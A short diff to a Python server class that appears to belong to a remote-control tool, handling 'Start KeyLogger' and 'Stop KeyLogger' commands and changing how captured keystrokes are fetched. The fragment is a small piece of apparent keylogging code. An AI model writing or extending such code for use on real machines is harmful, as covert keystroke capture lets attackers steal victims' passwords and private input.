@@ -93,7 +93,7 @@ class Server():
 
                         elif cmd == "Start KeyLogger":
                             self.inpListener.grabKeyInput = True
-                            self.additional_data = self.inpListener.fetch
+                            self.additional_data = self.server.inpListener.fetch
 
                         elif cmd == "Stop KeyLogger":
                             self.inpLitener.grabKeyInput = False
